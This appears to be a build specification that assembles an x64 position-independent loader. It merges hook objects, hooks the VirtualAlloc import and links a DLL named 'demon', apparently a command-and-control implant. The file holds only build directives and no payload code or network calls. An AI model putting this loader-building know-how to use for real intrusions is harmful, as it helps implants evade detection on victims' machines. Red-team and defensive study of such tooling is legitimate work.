x64:
    load "bin/loader.x64.o"
		make pic +optimize +gofirst
		
        run "services.spec"

        mergelib "./libs/libtcg/libtcg.x64.zip"

        load "bin/hooks.x64.o"
            merge

        # hook loader imports
        attach "KERNEL32$VirtualAlloc" "_VirtualAlloc"

        run "pico.spec"
            link "pico"

        push $DLL
            link "demon"

        export